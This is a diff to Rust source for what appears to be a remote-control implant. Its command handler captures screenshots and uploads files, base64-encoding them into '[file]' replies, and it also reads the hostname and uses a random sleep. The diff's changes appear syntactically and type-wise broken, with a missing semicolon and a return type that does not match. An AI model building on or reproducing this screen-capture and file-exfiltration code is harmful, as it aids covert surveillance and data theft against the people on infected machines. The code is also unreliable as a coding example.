@@ -18,7 +18,7 @@ use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 use rand::Rng;
-use std::fs;
+use std::{fs,env};
 use std::path::{Path, Prefix};
 use base64::{engine::general_purpose, Engine as _};
 use screenshots::Screen;
@@ -67,8 +67,8 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
 
     let mut buf = Vec::new();
     image.write_to(&mut buf, image::ImageOutputFormat::Png)?;
-
-    Ok(general_purpose::STANDARD.encode(buf)())
+    let encoded = general_purpose::STANDARD.encode(&buf) 
+    Ok(format!("{}",encoded).into_bytes())
 }
 
 /// Build prompt string
@@ -114,12 +114,12 @@ Available commands:
                 .get(0)
                 .ok_or_else(|| anyhow!("Missing filename"))?;
 
-            if filename.into_string() == ""{
+            if filename == &""{
                 let encoded = take_screenshot_base64()?;
                 Ok(format!("[file] screenshot.png {}", encoded).into_bytes())
             }else{
                 let encoded = take_screenshot_base64()?;
-                Ok(format!("[file] {} {}",filename.into_string(), encoded).into_bytes())
+                Ok(format!("[file] {} {}",filename, encoded).into_bytes())
             }
         }
         "upload" => {
@@ -135,11 +135,11 @@ Available commands:
                 .file_name()
                 .and_then(|f| f.to_str())
                 .ok_or_else(|| anyhow!("invalid filename"))?;
-
+            let encoded = general_purpose::STANDARD.encode(&data);
             Ok(format!(
                 "[file] {} {}",
                 filename,
-                general_purpose::STANDARD.encode(&data)
+                encoded
             )
             .into_bytes())
         }
